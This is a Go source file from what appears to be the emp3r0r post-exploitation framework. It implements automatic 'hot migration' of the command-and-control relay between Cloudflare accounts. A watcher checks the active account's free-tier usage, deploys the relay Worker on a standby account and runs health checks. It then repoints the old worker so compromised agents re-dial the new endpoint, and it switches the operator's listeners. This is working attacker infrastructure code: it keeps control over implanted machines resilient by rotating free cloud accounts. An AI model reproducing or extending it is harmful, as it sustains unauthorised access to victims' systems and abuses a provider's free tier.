package server

import (
	"context"
	"fmt"
	"net/url"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// Hot migration between Cloudflare accounts hosting the relay Worker.
//
// The watcher polls the active account's DO-request burn; when it crosses
// cf_accounts.json's migrate_threshold (default 90% of the 100k/month free
// tier), the fleet moves to the next standby account:
//
//	deploy standby worker -> health check -> repoint old worker (MIGRATE_URL)
//	-> switch CC relay listeners -> record history -> notify the panel
//
// Agents follow the close(4002, newURL) frame the old worker emits and
// re-dial the new endpoint (see c2channel_workerws.go relayMigrationClose).

var (
	cfMigrateMu    sync.Mutex
	cfWatcherCtx   context.Context
	cfWatcherCancel context.CancelFunc
	cfWatcherOnce  sync.Once
)

// StartCFMigrationWatcher launches the background quota watcher. Safe to
// call multiple times (only one watcher runs).
func StartCFMigrationWatcher(ctx context.Context) {
	cfWatcherOnce.Do(func() {
		cfWatcherCtx, cfWatcherCancel = context.WithCancel(ctx)
		go cfMigrationWatchLoop()
		logging.Infof("CF relay hot-migration watcher started (interval 5m)")
	})
}

// StopCFMigrationWatcher stops the watcher (used on shutdown).
func StopCFMigrationWatcher() {
	if cfWatcherCancel != nil {
		cfWatcherCancel()
	}
}

func cfMigrationWatchLoop() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for {
		select {
		case <-cfWatcherCtx.Done():
			return
		case <-ticker.C:
			cfg, err := loadCFAccounts()
			if err != nil {
				logging.Warningf("cf migrate: %v", err)
				continue
			}
			if !cfg.AutoMigrate {
				continue
			}
			active, err := cfActiveAccount()
			if err != nil {
				logging.Debugf("cf migrate: %v", err)
				continue
			}
			q, err := fetchCFQuota(&cfRelayConfig{APIToken: active.APIToken, AccountID: active.ID})
			if err != nil {
				logging.Warningf("cf migrate: quota fetch failed: %v", err)
				continue
			}
			usedPct := 100.0 * float64(q.DurableObjects.RequestsMonth) / float64(q.Limits.DORequestsPerMonth)
			if int(usedPct) < cfg.MigrateThreshold {
				continue
			}
			target := nextStandbyAccount(cfg)
			if target == nil {
				logging.Errorf("cf migrate: DO usage %.0f%% over threshold %d%% but no standby account available",
					usedPct, cfg.MigrateThreshold)
				continue
			}
			logging.Warningf("cf migrate: DO usage %.0f%% >= %d%% threshold, migrating to account %s",
				usedPct, cfg.MigrateThreshold, target.Label)
			if err := MigrateRelayTo(target.ID, fmt.Sprintf("quota %.0f%% >= %d%%", usedPct, cfg.MigrateThreshold)); err != nil {
				logging.Errorf("cf migrate: %v", err)
			}
		}
	}
}

// MigrateRelayTo performs a full hot migration to the given account. The
// caller may invoke it manually (panel button) or automatically (watcher).
func MigrateRelayTo(targetID, reason string) error {
	cfMigrateMu.Lock()
	defer cfMigrateMu.Unlock()

	cfg, err := loadCFAccounts()
	if err != nil {
		return err
	}
	target := cfg.findByID(targetID)
	if target == nil {
		return fmt.Errorf("unknown CF account %s", targetID)
	}
	if target.ID == cfg.ActiveAccountID {
		return fmt.Errorf("account %s is already active", targetID)
	}
	if target.APIToken == "" {
		return fmt.Errorf("account %s has no API token", targetID)
	}
	active, err := cfActiveAccount()
	if err != nil {
		// no active account yet: treat as initial deployment
		active = nil
	}
	if cfg.SharedSecret == "" && active != nil {
		// derive the shared secret from the current relay_urls so the new
		// deployment accepts the exact same agents/CC
		cfg.SharedSecret = relaySecretOf(live.RuntimeConfig.RelayURLs)
	}

	fromHost := ""
	if active != nil {
		fromHost = relayHostOf(live.RuntimeConfig.RelayURLs[0])
	}

	logging.Warningf("cf migrate: deploying relay on %s (%s)", target.Label, target.ID)
	relayBase, err := deployRelayWorker(target, cfg.WorkerName, cfg.SharedSecret)
	if err != nil {
		return fmt.Errorf("deploy on %s: %w", target.ID, err)
	}
	if err := waitDNSReady(relayHostOf(relayBase), 120*time.Second); err != nil {
		return fmt.Errorf("dns warmup for %s: %w", relayBase, err)
	}
	if err := checkWorkerHealth(relayBase, 60*time.Second); err != nil {
		return fmt.Errorf("health check on %s: %w", relayBase, err)
	}

	// Build the two room URLs the CC listens on (same-domain dual room).
	relayURLs := []string{
		relayBase + "/ws/" + cfDefaultRoomA + "?role=cc&secret=" + url.QueryEscape(cfg.SharedSecret),
		relayBase + "/ws/" + cfDefaultRoomB + "?role=cc&secret=" + url.QueryEscape(cfg.SharedSecret),
	}
	logging.Warningf("cf migrate: %s healthy, new relay %s", target.Label, relayBase)

	// Point the old worker at the new deployment: existing agents get
	// close(4002, newURL), new connections get 409.
	if active != nil {
		migrateURL := relayBase + "/ws/" + cfDefaultRoomA + "?role=agent&secret=" + url.QueryEscape(cfg.SharedSecret)
		if err := pointWorkerAtMigration(active, cfg.WorkerName, cfg.SharedSecret, migrateURL); err != nil {
			logging.Warningf("cf migrate: failed to repoint old worker %s with MIGRATE_URL: %v", active.ID, err)
			// fallback: drop the old zone route so the old domain fails and
			// agents fail over to the next embedded endpoint
			if rerr := removeRelayRoute(active, cfg.WorkerName); rerr != nil {
				logging.Warningf("cf migrate: failed to remove old relay route %s (agents may keep dialing the old domain): %v",
					active.ID, rerr)
			}
		}
	}

	// Switch the CC's relay listeners to the new endpoints.
	oldURLs := append([]string(nil), live.RuntimeConfig.RelayURLs...)
	live.RuntimeConfig.RelayURLs = relayURLs
	if err := config.SaveConfigJSON(); err != nil {
		logging.Warningf("cf migrate: failed to persist relay_urls: %v", err)
	}
	restartRelayListeners(relayURLs)

	// Persist fleet state + history.
	toHost := relayHostOf(relayURLs[0])
	entry := &CFMigrationHistoryEntry{
		Time:     time.Now(),
		FromID:   func() string { if active != nil { return active.ID }; return "" }(),
		ToID:     target.ID,
		FromHost: fromHost,
		ToHost:   toHost,
		Reason:   reason,
	}
	_ = mutateCFAccounts(func(c *cfAccountsConfig) error {
		c.ActiveAccountID = target.ID
		c.SharedSecret = cfg.SharedSecret
		c.MigrationHistory = append(c.MigrationHistory, entry)
		return nil
	})

	// Drop the quota cache so the panel reflects the new active account.
	cfQuotaCacheMu.Lock()
	cfQuotaCache, cfQuotaCacheAt = nil, time.Time{}
	cfQuotaCacheMu.Unlock()

	logging.Successf("cf migrate: relay now on %s (%s); old endpoints %v", toHost, target.ID, oldURLs)
	BroadcastToWebClients("cf_migrated", map[string]any{
		"from_account": entry.FromID,
		"to_account":   entry.ToID,
		"from_host":    entry.FromHost,
		"to_host":      entry.ToHost,
		"reason":       entry.Reason,
		"time":         entry.Time,
	})
	return nil
}

// restartRelayListeners tears down the current relay tunnels and re-dials
// the new URLs (CC side of a hot migration).
func restartRelayListeners(relayURLs []string) {
	if network.EmpRelayCancel != nil {
		network.EmpRelayCancel()
	}
	relayCtx, relayCancel := context.WithCancel(context.Background())
	network.EmpRelayCancel = relayCancel
	go StartRelayListeners(relayCtx, relayURLs)
}

// relaySecretOf extracts the shared secret from the first relay URL.
func relaySecretOf(urls []string) string {
	for _, u := range urls {
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		if s := parsed.Query().Get("secret"); s != "" {
			return s
		}
	}
	return ""
}
